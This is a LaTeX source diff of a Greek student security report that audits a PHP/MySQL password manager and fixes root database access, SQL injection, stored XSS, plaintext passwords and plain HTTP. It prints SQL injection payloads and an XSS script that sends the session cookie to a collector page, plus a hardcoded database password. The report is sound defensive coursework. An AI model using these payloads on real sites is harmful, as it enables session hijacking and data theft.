@@ -1,0 +1,395 @@
+\documentclass[a4paper,12pt]{article}
+
+% --- Language and Font Settings (The Overleaf Fix) ---
+\usepackage{fontspec}
+\usepackage{polyglossia}
+
+\usepackage{geometry}
+\geometry{
+    a4paper,
+    left=15mm,
+    right=15mm,
+    top=17.5mm,
+    bottom=17.5mm,
+}
+% Set Languages
+\setmainlanguage{greek}
+\setotherlanguage{english}
+
+% USE STANDARD OVERLEAF FONTS (Computer Modern Unicode)
+\setmainfont{CMU Serif}
+\setsansfont{CMU Sans Serif}
+\setmonofont{CMU Typewriter Text}
+
+% --- Formatting Packages ---
+\usepackage{csquotes}
+\usepackage{geometry}
+\geometry{left=2.5cm,right=2.5cm,top=2.5cm,bottom=2.5cm}
+\usepackage{graphicx} 
+\usepackage{float}    
+\usepackage{hyperref} 
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    filecolor=magenta,   
+    urlcolor=blue,
+    pdftitle={Security Report},
+}
+
+% --- Code Snippets Settings ---
+\usepackage{listings}
+\usepackage{xcolor}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                 
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    frame=single,
+    extendedchars=true,
+    literate={\_}{{\textunderscore}}1
+}
+
+\lstset{style=mystyle}
+
+% --- Document Start ---
+\begin{document}
+
+% --- Cover Page ---
+\begin{titlepage}
+    \centering
+    \vspace*{1cm}
+
+    % LOGO
+    \includegraphics[width=5cm]{logoauth.png}
+    
+    \vspace{1cm}
+
+    {\large ΤΜΗΜΑ ΗΛΕΚΤΡΟΛΟΓΩΝ ΜΗΧΑΝΙΚΩΝ ΚΑΙ ΜΗΧΑΝΙΚΩΝ ΥΠΟΛΟΓΙΣΤΩΝ}
+
+    \vspace{3cm}
+
+    {\huge\bfseries Ανάδειξη και Αντιμετώπιση Προβλημάτων Ασφάλειας σε Εφαρμογή Password Manager}
+
+    \vspace{2cm}
+    {\large Ασφάλεια Πληροφοριακών Συστημάτων}
+
+    \vfill
+
+    \begin{center}
+    Νίκος Τουλκερίδης \\
+    10718 \\
+    toulkeri@ece.auth.gr
+    \end{center}
+
+    \vspace{1cm}
+
+    {\large\today}
+
+\end{titlepage}
+
+\newpage
+\tableofcontents
+\newpage
+
+\section{Εισαγωγή}
+Σκοπός της παρούσας εργασίας είναι η ανάλυση της ασφάλειας μιας web εφαρμογής διαχείρισης κωδικών (Password Manager), ο εντοπισμός ευπαθειών και η διόρθωσή τους.
+Η εφαρμογή είναι υλοποιημένη σε PHP και χρησιμοποιεί βάση δεδομένων MySQL.
+Κατά τον έλεγχο εντοπίστηκαν κρίσιμα κενά ασφαλείας που παραβιάζουν βασικές αρχές της ασφάλειας πληροφοριακών συστημάτων, όπως η αρχή των ελάχιστων προνομίων και η εμπιστευτικότητα των δεδομένων.
+
+\section{Ανάλυση και Αντιμετώπιση Ευπαθειών}
+Στην ενότητα αυτή παρουσιάζονται αναλυτικά τα κενά ασφαλείας που εντοπίστηκαν, καθώς και οι λύσεις που εφαρμόστηκαν για την αντιμετώπισή τους.
+
+
+
+% --- 1. Root Privileges ---
+\subsection{Σύνδεση με Δικαιώματα Διαχειριστή (Root Privileges)}
+
+\subsubsection*{Εντοπισμός Ευπάθειας}
+Κατά την επισκόπηση του πηγαίου κώδικα, εντοπίστηκε ότι η εφαρμογή συνδέεται στη βάση δεδομένων MySQL χρησιμοποιώντας τον λογαριασμό \texttt{root} με κενό κωδικό πρόσβασης (empty password).
+Αυτό παρατηρήθηκε στα αρχεία \texttt{login.php}, \texttt{register.php} και \texttt{dashboard.php}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{1-mysql-connect-VULV.png}
+    \caption{Εντοπισμός των διαπιστευτηρίων root στον κώδικα του login.php.}
+    \label{fig:root-connection}
+\end{figure}
+
+\textbf{Ανάλυση Κινδύνου:}
+Η χρήση του λογαριασμού \texttt{root} (super-user) παραβιάζει θεμελιωδώς την αρχή των ελάχιστων προνομίων (Principle of Least Privilege). 
+Σε περίπτωση που ένας επιτιθέμενος εκμεταλλευτεί μια ευπάθεια SQL Injection (η οποία υπάρχει στην εφαρμογή), θα αποκτήσει πλήρη δικαιώματα στον διακομιστή βάσης δεδομένων. Αυτό του επιτρέπει να:
+\begin{itemize}
+    \item Διαβάσει ή να διαγράψει οποιαδήποτε βάση δεδομένων (όχι μόνο την \texttt{pwd\_mgr}).
+    \item Διαχειριστεί λογαριασμούς χρηστών της MySQL.
+    \item Διαβάσει αρχεία του συστήματος (αν το επιτρέπει η ρύθμιση \texttt{secure\_file\_priv}).
+\end{itemize}
+
+\subsubsection*{Αντιμετώπιση και Διόρθωση}
+Για την επίλυση του προβλήματος ακολουθήθηκε μια διαδικασία δύο βημάτων: η δημιουργία ενός περιορισμένου χρήστη στη βάση δεδομένων και η ενημέρωση του κώδικα της εφαρμογής.
+
+\paragraph{Βήμα 1: Δημιουργία Χρήστη με Περιορισμένα Δικαιώματα}
+Μέσω του \texttt{http://localhost/phpmyadmin}, δημιουργήθηκε ο χρήστης \texttt{sec\_user} με ισχυρό κωδικό πρόσβασης(\texttt{mexriNAsbhseiOhlios5911!}).
+Στον χρήστη αυτόν αποδόθηκαν δικαιώματα \textbf{μόνο} για τη βάση \texttt{pwd\_mgr} και συγκεκριμένα μόνο για τις εντολές που απαιτεί η λειτουργία της εφαρμογής (SELECT, INSERT, UPDATE, DELETE).
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{fix_sec_user_create.png}
+    \caption{Επιτυχής δημιουργία χρήστη sec\_user και ανάθεση περιορισμένων δικαιωμάτων.}
+    \label{fig:sec-user-create}
+\end{figure}
+
+\paragraph{Βήμα 2: Ενημέρωση Κώδικα PHP}
+Ο κώδικας σύνδεσης σε όλα τα αρχεία PHP (\texttt{login.php}, \texttt{register.php}, \texttt{dashboard.php}, \texttt{notes.php}) τροποποιήθηκε ώστε να χρησιμοποιεί τα νέα διαπιστευτήρια:
+
+\begin{lstlisting}[language=PHP, caption=Νέος κώδικας σύνδεσης (login.php)]
+// Connect to the database using the secured user
+$conn = mysqli_connect("localhost", "sec_user", "mexriNAsbhseiOhlios5911!", "pwd_mgr");
+\end{lstlisting}
+
+\paragraph{Βήμα 3: Επαλήθευση}
+Για να επιβεβαιώσουμε την ορθότητα της λύσης, συνδεθήκαμε στη MySQL ως \texttt{sec\_user}. 
+Όπως φαίνεται στην παρακάτω εικόνα, ο χρήστης έχει πρόσβαση στα δεδομένα της εφαρμογής, αλλά του απαγορεύεται η πρόσβαση σε βάσεις δεδομένων συστήματος (π.χ. \texttt{mysql}), αποτρέποντας την κλιμάκωση προνομίων.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{fix_access_denied.png}
+    \caption{Άρνηση πρόσβασης (Access Denied) στη βάση mysql για τον χρήστη sec\_user.}
+    \label{fig:access-denied}
+\end{figure}
+
+% --- 2. SQL Injection (IMPROVED SECTION) ---
+\subsection{Ευπάθεια SQL Injection}
+
+\subsubsection*{Εντοπισμός Ευπάθειας}
+Κατά τον έλεγχο του κώδικα, διαπιστώθηκε ότι η εφαρμογή κατασκεύαζε τα ερωτήματα SQL (Queries) συνενώνοντας απευθείας τα δεδομένα εισόδου του χρήστη (String Concatenation). 
+Αυτό εντοπίστηκε σε όλα τα σημεία αλληλεπίδρασης με τη βάση δεδομένων:
+\begin{itemize}
+    \item \texttt{login.php}: Στο ερώτημα SELECT για την είσοδο χρήστη.
+    \item \texttt{register.php}: Στο ερώτημα INSERT για την εγγραφή νέου χρήστη.
+    \item \texttt{dashboard.php}: Στα ερωτήματα εισαγωγής και διαγραφής εγγραφών ιστοσελίδων.
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{vuln_sqli_code.png}
+    \caption{Ευάλωτος κώδικας στο login.php. Η μεταβλητή \$username εισάγεται χωρίς έλεγχο.}
+    \label{fig:sqli-login}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{2-code_before-2o.png}
+    \caption{Ευάλωτος κώδικας στο register.php. SQL Injection μέσω του username/password κατά την εγγραφή.}
+    \label{fig:sqli-register}
+\end{figure}
+
+\textbf{Ανάλυση Κινδύνου:}
+Η πρακτική αυτή επιτρέπει σε έναν επιτιθέμενο να αλλοιώσει τη λογική του ερωτήματος SQL. 
+Για παράδειγμα, εισάγοντας το payload \texttt{' OR '1'='1} στο πεδίο username της φόρμας login, το παραγόμενο ερώτημα γίνεται:
+\begin{lstlisting}[language=SQL, basicstyle=\ttfamily\small]
+SELECT * FROM login_users WHERE username='' OR '1'='1' AND password='...';
+\end{lstlisting}
+Η συνθήκη \texttt{'1'='1'} είναι πάντα αληθής, οδηγώντας σε παράκαμψη της πιστοποίησης (Authentication Bypass) και είσοδο ως ο πρώτος χρήστης της βάσης (συνήθως ο διαχειριστής).
+
+\subsubsection*{Αντιμετώπιση: Χρήση Prepared Statements}
+Για την οριστική αντιμετώπιση του προβλήματος, αντικαταστάθηκαν όλα τα δυναμικά ερωτήματα SQL με \textbf{Prepared Statements} (Προετοιμασμένες Δηλώσεις) χρησιμοποιώντας τη βιβλιοθήκη MySQLi.
+
+Η τεχνική αυτή διαχωρίζει τον κώδικα SQL από τα δεδομένα. Η βάση δεδομένων λαμβάνει πρώτα τη δομή του ερωτήματος (με χαρακτήρες \texttt{?}) και στη συνέχεια τα δεδομένα τοποθετούνται στις θέσεις αυτές αυστηρά ως τιμές (parameters), καθιστώντας αδύνατη την εκτέλεσή τους ως εντολές SQL.
+
+\textbf{Παράδειγμα Διόρθωσης στο login.php (SELECT):}
+\begin{lstlisting}[language=PHP, caption={Ασφαλής κώδικας με bind\_param}]
+// Προετοιμασία του ερωτήματος με placeholder (?)
+$stmt = $conn->prepare("SELECT * FROM login_users WHERE username = ?");
+// Σύνδεση της παραμέτρου (s = string)
+$stmt->bind_param("s", $username); 
+$stmt->execute();
+$result = $stmt->get_result();
+$stmt->close();
+\end{lstlisting}
+
+\textbf{Παράδειγμα Διόρθωσης στο register.php (INSERT):}
+\begin{lstlisting}[language=PHP, caption={Ασφαλής εισαγωγή νέου χρήστη}]
+// Χρήση Prepared Statement για την εισαγωγή
+$stmt = $conn->prepare("INSERT INTO login_users (username, password) VALUES (?, ?)");
+$stmt->bind_param("ss", $new_username, $hashed_password);
+$result = $stmt->execute();
+$stmt->close();
+\end{lstlisting}
+
+Με αυτές τις αλλαγές, ακόμη και αν ένας χρήστης εισάγει ειδικούς χαρακτήρες SQL (π.χ. \texttt{admin'; DROP TABLE users;--}), αυτοί θα αποθηκευτούν απλώς ως μέρος του ονόματος χρήστη και δεν θα εκτελεστούν.
+
+
+
+% --- 3. XSS (IMPROVED SECTION) ---
+\subsection{Ευπάθεια Cross Site Scripting (XSS)}
+
+\subsubsection*{Εντοπισμός Ευπάθειας}
+Η εφαρμογή επιτρέπει στους χρήστες να καταχωρούν σημειώσεις μέσω του αρχείου \texttt{notes.php}. 
+Κατά την επισκόπηση του κώδικα, διαπιστώθηκε ότι τα δεδομένα των σημειώσεων εμφανίζονται στους χρήστες ακριβώς όπως αποθηκεύτηκαν στη βάση δεδομένων, χωρίς καμία επεξεργασία ή κωδικοποίηση εξόδου (Output Encoding).
+
+\begin{lstlisting}[language=PHP, caption=Ευάλωτος κώδικας εμφάνισης στο notes.php]
+// Τα δεδομένα εμφανίζονται raw (ακατέργαστα)
+echo "<div class='note-content'>" . $row["note"] . "</div>";
+\end{lstlisting}
+
+\textbf{Ανάλυση Κινδύνου (Stored XSS):}
+Αυτό επιτρέπει την επίθεση \textbf{Stored XSS}. Ένας κακόβουλος χρήστης μπορεί να εισάγει κώδικα JavaScript στο πεδίο της σημείωσης. 
+Όταν ένας άλλος χρήστης (π.χ. ο διαχειριστής) επισκεφτεί τη σελίδα \texttt{notes.php}, ο κώδικας θα εκτελεστεί αυτόματα στον φυλλομετρητή του.
+
+\textbf{Σενάριο Επίθεσης (Cookie Stealing):}
+Όπως φαίνεται και στα βοηθητικά αρχεία της επίθεσης (\texttt{getcookie.php}), ένας επιτιθέμενος μπορεί να χρησιμοποιήσει το εξής payload για να υποκλέψει το Session ID του θύματος:
+\begin{lstlisting}[language=HTML, basicstyle=\ttfamily\small]
+<script>
+fetch(`http://localhost/passman/xss/getcookie.php?v=`+document.cookie);
+</script>
+\end{lstlisting}
+Το κλεμμένο cookie αποθηκεύεται στο αρχείο \texttt{stolencookies.txt} και μπορεί να προβληθεί μέσω του \texttt{listcookies.php}, επιτρέποντας στον επιτιθέμενο να καταλάβει τη συνεδρία του χρήστη (Session Hijacking).
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{vuln_xss_proof.png}
+    \caption{Απόδειξη ευπάθειας: Λίστα υποκλεμμένων cookies (PHPSESSID) που συγκεντρώθηκαν μέσω της επίθεσης.}
+    \label{fig:xss-vuln}
+\end{figure}
+
+\subsubsection*{Αντιμετώπιση: Φιλτράρισμο Εισόδου/Εξόδου}
+Για την αντιμετώπιση του προβλήματος, εφαρμόστηκε η τεχνική \textbf{Output Encoding} (Κωδικοποίηση Εξόδου).
+Συγκεκριμένα, στο αρχείο \texttt{notes.php}, η εμφάνιση των δεδομένων τροποποιήθηκε ώστε να γίνεται μέσω της συνάρτησης \texttt{htmlspecialchars()}.
+
+\begin{lstlisting}[language=PHP, caption=Διορθωμένος κώδικας στο notes.php]
+// Μετατροπή ειδικών χαρακτήρων σε HTML entities
+echo "<div class='note-content'>" . htmlspecialchars($row["note"]) . "</div>";
+\end{lstlisting}
+
+Η συνάρτηση αυτή μετατρέπει τους ειδικούς χαρακτήρες (όπως \texttt{<}, \texttt{>}, \texttt{"}, \texttt{'}) σε HTML entities (π.χ. το \texttt{<script>} γίνεται \texttt{\&lt;script\&gt;}). 
+Έτσι, ο φυλλομετρητής ερμηνεύει τα δεδομένα ως απλό κείμενο και όχι ως εκτελέσιμο κώδικα.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{fix_xss_proof.png}
+    \caption{Αποτέλεσμα διόρθωσης: Ο κώδικας JavaScript εμφανίζεται ως απλό κείμενο και δεν εκτελείται.}
+    \label{fig:xss-fixed}
+\end{figure}
+
+\newpage
+% --- 4. Plaintext Passwords (IMPROVED SECTION) ---
+\subsection{Αποθήκευση Κωδικών σε Απλό Κείμενο (Plaintext)}
+
+\subsubsection*{Εντοπισμός Ευπάθειας}
+Κατά τον έλεγχο της βάσης δεδομένων \texttt{pwd\_mgr}, διαπιστώθηκε ότι οι κωδικοί πρόσβασης στον πίνακα \texttt{login\_users} αποθηκεύονταν ως απλό κείμενο (plaintext). Αυτό σημαίνει ότι οποιοσδήποτε έχει πρόσβαση στη βάση δεδομένων (π.χ. διαχειριστής συστήματος ή επιτιθέμενος μέσω SQL Injection) μπορεί να διαβάσει άμεσα τους κωδικούς όλων των χρηστών.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{vuln_plaintext_db.png}
+    \caption{Στιγμιότυπο της βάσης δεδομένων πριν τη διόρθωση. Οι κωδικοί "p1" και "123456" είναι πλήρως αναγνώσιμοι.}
+    \label{fig:plaintext-proof}
+\end{figure}
+
+\textbf{Ανάλυση Κινδύνου:}
+Η αποθήκευση κωδικών σε απλή μορφή αποτελεί κρίσιμο κενό ασφαλείας. Σε περίπτωση διαρροής δεδομένων, οι κωδικοί μπορούν να χρησιμοποιηθούν άμεσα για παραβίαση λογαριασμών, χωρίς να απαιτείται διαδικασία αποκρυπτογράφησης ή cracking.
+
+\subsubsection*{Αντιμετώπιση: Ασφαλής Αποθήκευση (Hashing)}
+Για την αντιμετώπιση του προβλήματος, καταργήθηκε η αποθήκευση σε απλή μορφή και υιοθετήθηκε η χρήση κρυπτογραφικών συναρτήσεων κατακερματισμού (Hashing).
+Συγκεκριμένα, χρησιμοποιήθηκε ο αλγόριθμος \textbf{Bcrypt} μέσω των ενσωματωμένων συναρτήσεων της PHP.
+
+\textbf{Αλλαγές στον Κώδικα:}
+\begin{itemize}
+    \item \textbf{Εγγραφή (register.php):} Πριν την αποθήκευση στη βάση, ο κωδικός μετατρέπεται σε hash.
+\begin{lstlisting}[language=PHP, caption=Hashing κωδικού κατά την εγγραφή]
+$hashed_password = password_hash($new_password, PASSWORD_DEFAULT);
+// Η εισαγωγή στη βάση γίνεται πλέον με το $hashed_password
+\end{lstlisting}
+
+    \item \textbf{Είσοδος (login.php):} Η ταυτοποίηση δεν γίνεται πλέον με απλή σύγκριση strings, αλλά με τη συνάρτηση επαλήθευσης hash.
+\begin{lstlisting}[language=PHP, caption=Επαλήθευση κωδικού κατά το login]
+// Έλεγχος αν ο κωδικός ταιριάζει με το αποθηκευμένο hash
+if (password_verify($password, $row['password'])) {
+    // Επιτυχής είσοδος
+}
+\end{lstlisting}
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{fix_hashing_proof.png}
+    \caption{Η βάση δεδομένων μετά τη διόρθωση. Ο νέος χρήστης "secure\_user" έχει κωδικό σε μορφή hash (\$2y\$10\$...), καθιστώντας τον μη αναγνώσιμο.}
+    \label{fig:hashing-proof}
+\end{figure}
+
+\newpage
+% --- 5. HTTP ---
+\subsection{Χρήση Μη Ασφαλούς Πρωτοκόλλου (HTTP)}
+
+\subsubsection*{Εντοπισμός Ευπάθειας}
+Η εφαρμογή λειτουργεί πάνω από το πρωτόκολλο HTTP, το οποίο δεν παρέχει κρυπτογράφηση στην επικοινωνία μεταξύ του φυλλομετρητή (Client) και του διακομιστή (Server).
+Κατά την ανάλυση της κίνησης δικτύου (Network Traffic Analysis) κατά τη διαδικασία της εισόδου, διαπιστώθηκε ότι τα διαπιστευτήρια (username, password) αποστέλλονται ως απλό κείμενο.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{vuln_http_sniff.png}
+    \caption{Ανάλυση κίνησης δικτύου (Network Tab) #1.}
+    \label{fig:http-sniff}
+\end{figure}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{vuln_http_sniff_proof.png}
+    \caption{Ανάλυση κίνησης δικτύου (Network Tab #2). Ο κωδικός πρόσβασης "secret123" είναι ορατός στο πεδίο Form Data καθώς δεν υπάρχει κρυπτογράφηση.}
+    \label{fig:http-sniff}
+\end{figure}
+
+\textbf{Ανάλυση Κινδύνου (Man-in-the-Middle):}
+Η έλλειψη κρυπτογράφησης επιτρέπει σε κακόβουλους τρίτους που βρίσκονται στο ίδιο δίκτυο (π.χ. δημόσιο Wi-Fi) να υποκλέψουν ευαίσθητα δεδομένα μέσω επιθέσεων Man-in-the-Middle (MitM).
+
+\subsubsection*{Προτεινόμενη Αντιμετώπιση: Εξαναγκασμός HTTPS}
+Η πλήρης επίλυση απαιτεί την εγκατάσταση πιστοποιητικού SSL/TLS στον Web Server (Apache). 
+Ωστόσο, σε επίπεδο εφαρμογής (Application Layer), προτείνεται και παρατίθεται ο παρακάτω κώδικας που πρέπει να προστεθεί στην αρχή κάθε αρχείου PHP (\texttt{login.php, dashboard.php, register.php, notes.php}).\\
+
+Ο κώδικας αυτός εξυπηρετεί δύο σκοπούς:
+\begin{enumerate}
+    \item \textbf{HTTPS Redirection:} Αναγκάζει τον browser να χρησιμοποιεί πάντα ασφαλή σύνδεση.
+    \item \textbf{Secure Cookies:} Ορίζει τις σημαίες \texttt{Secure} (αποστολή μόνο μέσω HTTPS), \texttt{HttpOnly} (απαγόρευση πρόσβασης από JavaScript) και \texttt{SameSite} (προστασία από CSRF) στα cookies συνεδρίας.
+\end{enumerate}
+
+
+\begin{lstlisting}[language=PHP, caption={Προτεινόμενος κώδικας για εξαναγκασμό HTTPS και Secure Cookies}]
+// 1. Force HTTPS redirection
+if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === "off") {
+    $location = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    header('HTTP/1.1 301 Moved Permanently');
+    header('Location: ' . $location);
+    exit;
+}
+
+// 2. Set Secure Session Parameters
+$cookieParams = session_get_cookie_params();
+session_set_cookie_params([
+    'lifetime' => $cookieParams['lifetime'],
+    'path' => $cookieParams['path'],
+    'domain' => $cookieParams['domain'],
+    'secure' => true, // SEND ONLY OVER HTTPS
+    'httponly' => true, // PREVENT JAVASCRIPT ACCESS
+    'samesite' => 'Strict'
+]);
+session_start();
+\end{lstlisting}
+
+
+\end{document}
